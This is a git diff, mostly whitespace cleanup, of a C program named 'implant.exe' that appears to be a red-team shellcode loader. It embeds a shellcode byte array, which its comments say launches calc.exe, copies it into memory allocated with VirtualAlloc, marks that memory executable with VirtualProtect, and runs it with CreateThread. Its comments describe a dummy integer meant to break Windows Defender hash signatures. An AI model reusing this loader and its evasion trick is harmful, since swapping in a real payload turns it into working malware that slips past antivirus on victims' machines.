@@ -7,15 +7,15 @@
 
 
 int main(int argc, char* argv[]) {
-	
+
 	//we disable optimizations and use this int to break the hash checks used by Windows Defender and force emulation
-	unsigned int break_sig = 99137835; 
+	unsigned int break_sig = 99137835;
 
 	void* exec_mem = NULL;
 	BOOL rv;
 	HMODULE th = NULL;
 	DWORD oldprotect = 0;
-	
+
 	if (strcmp(argv[0],"implant.exe") == 0){
 		//Our payload is where we typically put our malicious code, in this case we're calling calc.exe
 		unsigned char payload[] ={
@@ -44,27 +44,27 @@ int main(int argc, char* argv[]) {
 		0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
 		};
 		//Get size of our payload, we'll need this later
-		unsigned int payload_len = sizeof(payload); 
-		
+		unsigned int payload_len = sizeof(payload);
+
 		//allocate a place to write our code in memory, we only need READ/WRITE permissions
 		exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		
+
 		//copy our payload to the place we just allocated
 		RtlMoveMemory(exec_mem, payload, payload_len);
-		
+
 		//We need EXECUTE/READ permissions now so that our payload can be executed
 		rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
-		
+
 		//If we successfully changed the permissions at the address our payload has been written to, try to make a new thread (execute the payload)
 		if (rv != 0) {
-			
+
 			//execute the payload
 			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
-			
+
 			//wait for payload to terminate
 			WaitForSingleObject(th, -1);
 		}
-		
+
 		//clean up
 		CloseHandle(th);
 	}
